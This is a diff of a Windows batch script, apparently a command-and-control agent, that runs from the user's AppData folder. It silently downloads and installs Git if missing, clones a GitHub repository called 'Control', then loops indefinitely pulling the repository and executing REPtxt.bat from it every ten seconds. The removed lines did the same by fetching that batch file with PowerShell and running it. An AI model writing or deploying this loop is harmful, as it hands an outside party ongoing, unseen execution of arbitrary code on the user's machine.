@@ -1,15 +1,28 @@
 cd C:\users\%username%\AppData
-:begin
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat").Content >cmd.bat
->nul find "At" cmd.bat && (
-  goto offline
+git version >git.sav
+>nul find "version" git.sav && (
+  goto nxt
 ) || (
-  call cmd.bat
+  goto GIT_download
 )
-del cmd.bat
+:nxt
+if not exist Control (git clone https://github.com/Guest257351/Control)
+cd Control
+:begin
+git pull
+timeout 1 /NOBREAK >nul
+call REPtxt.bat
 timeout 10 /NOBREAK >nul
 goto begin
 :offline
 del cmd.bat
+timeout 10 /NOBREAK >nul
+goto begin
+:GIT_download
+powershell Import-Module BitsTransfer
+powershell Start-BitsTransfer -source "https://github.com/git-for-windows/git/releases/download/v2.31.0.windows.1/Git-2.31.0-64-bit.exe" -Destination gitDL.exe
+timeout 1 /NOBREAK >nul
+gitDL.exe /verysilent
+del gitDL.exe
 timeout 10 /NOBREAK >nul
 goto begin
